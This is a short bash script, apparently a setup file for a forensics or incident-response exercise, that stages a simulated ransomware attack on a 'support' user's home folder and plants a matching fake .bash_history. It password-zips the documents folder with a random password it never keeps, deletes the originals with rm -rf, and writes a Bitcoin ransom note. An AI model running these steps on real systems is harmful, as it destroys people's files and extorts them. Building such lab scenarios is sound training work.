#!/bin/bash

# Access the user folder
cd /home/support/

# Generate random password
PASSWORD=$(python3 -c "import secrets, string; print(''.join(secrets.choice(string.ascii_letters + string.digits) for _ in range(32)))")

# Simulate malicious activity
echo "ls" >> ./.bash_history
echo "ls ./documents" >> ./.bash_history
zip --password $PASSWORD -r encrypted_files.zip ./documents/
echo "zip --password $PASSWORD -r encrypted_files.zip ./documents/" >> ./.bash_history
rm -rf ./documents
echo "rm -rf ./documents" >> ./.bash_history
echo "Transfer 2 Bitcoin to our address 1JC92RtUqNtvd3ZghWTEj3FyxuGfPRjpBW and we will give you the password." > ./readme-your-data-were-encrypted.txt
echo 'echo "Transfer 2 Bitcoin to our address 1JC92RtUqNtvd3ZghWTEj3FyxuGfPRjpBW and we will give you the password." > ./readme-your-data-were-encrypted.txt' >> ./.bash_history
echo "exit" >> ./.bash_history

# Fix ownership and permissions for history
chown -R support:support /home/support/
chmod 600 /home/support/.bash_history
